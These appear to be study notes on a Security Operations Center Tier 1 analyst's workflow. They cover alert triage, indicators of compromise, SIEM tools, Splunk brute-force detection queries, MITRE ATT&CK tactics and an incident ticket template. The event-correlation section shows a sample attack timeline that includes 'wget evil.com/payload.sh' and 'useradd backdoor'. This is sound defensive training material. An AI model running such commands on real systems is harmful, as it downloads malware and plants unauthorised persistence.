# SOC Tier 1 Workflow Notes

## What is a SOC?

A Security Operations Center (SOC) is a team that monitors, detects, investigates,
and responds to cybersecurity threats 24/7.

## Tier Structure

| Tier | Role | Responsibilities |
|------|------|-----------------|
| Tier 1 | Alert Analyst | Monitor SIEM, triage alerts, initial investigation |
| Tier 2 | Incident Responder | Deep-dive investigation, containment |
| Tier 3 | Threat Hunter / Expert | Proactive hunting, advanced forensics |

---

## Tier 1 Daily Workflow

```
1. Check SIEM dashboard for new alerts
2. Triage alert (True Positive / False Positive / Benign True Positive)
3. Investigate IOCs (IPs, hashes, domains) in threat intel feeds
4. Escalate TP to Tier 2 or close FP with documentation
5. Document findings in ticketing system (Jira, ServiceNow)
6. Update alerting rules to reduce false positive rate
```

---

## Key Log Analysis Concepts

### IOC (Indicator of Compromise)
Evidence that a system may have been compromised:
- Suspicious IP addresses
- Known malicious file hashes (MD5/SHA256)
- Unusual domain names (C2 servers)
- Unexpected user accounts
- Large data transfers at odd hours

### Event Correlation
Linking multiple log events to tell a story:
```
2:14 AM  → 12x failed SSH login from 192.168.1.105   (brute force)
2:15 AM  → Successful SSH login from 192.168.1.105   (compromise!)
2:15 AM  → sudo /bin/bash                             (privilege escalation)
2:15 AM  → wget evil.com/payload.sh                  (malware download)
2:16 AM  → useradd backdoor                          (persistence)
```
This tells a complete attack story: Initial Access → Execution → Persistence.

---

## SIEM Concepts

### What SIEM Does
- **Collects** logs from all systems (servers, firewalls, endpoints)
- **Normalizes** different log formats into standard fields
- **Correlates** events across multiple sources
- **Alerts** when rule thresholds are triggered
- **Stores** logs for forensic investigation

### Common SIEMs
| Product | Type |
|---------|------|
| Splunk | Enterprise / Free tier |
| IBM QRadar | Enterprise |
| Microsoft Sentinel | Cloud (Azure) |
| Elastic SIEM (ELK) | Open Source |
| Wazuh | Open Source |
| AlienVault OSSIM | Open Source |

### Splunk SPL Quick Reference
```splunk
# Failed SSH logins
source="/var/log/auth.log" "Failed password" | stats count by src_ip

# Brute force detection (>10 failures from same IP)
source="/var/log/auth.log" "Failed password"
| stats count by src_ip
| where count > 10

# Successful login after failures
source="/var/log/auth.log"
| eval status=if(match(_raw,"Failed"), "fail", "success")
| stats count(eval(status="fail")) as failures,
        count(eval(status="success")) as successes by src_ip
| where failures > 5 AND successes > 0
```

---

## MITRE ATT&CK Framework Quick Reference

| Tactic | Examples |
|--------|---------|
| Initial Access | Phishing, exploit public-facing app, valid accounts |
| Execution | PowerShell, bash, scheduled tasks |
| Persistence | New user, startup service, scheduled task |
| Privilege Escalation | sudo abuse, exploit, token manipulation |
| Defense Evasion | Log clearing, process injection, masquerading |
| Lateral Movement | Pass-the-hash, RDP, SSH |
| Exfiltration | C2 channel, cloud storage upload |

---

## Incident Documentation Template

```
Ticket #: SOC-XXXX
Date: 
Analyst: 
Severity: Critical / High / Medium / Low

Summary:
[1-2 sentence description]

Timeline:
- HH:MM - [Event description]
- HH:MM - [Event description]

IOCs:
- IP: x.x.x.x
- User: backdoor_user
- File: /tmp/malware.sh

Actions Taken:
- Blocked IP at firewall
- Disabled compromised account
- Escalated to Tier 2

Status: Open / In Progress / Resolved / Escalated
```
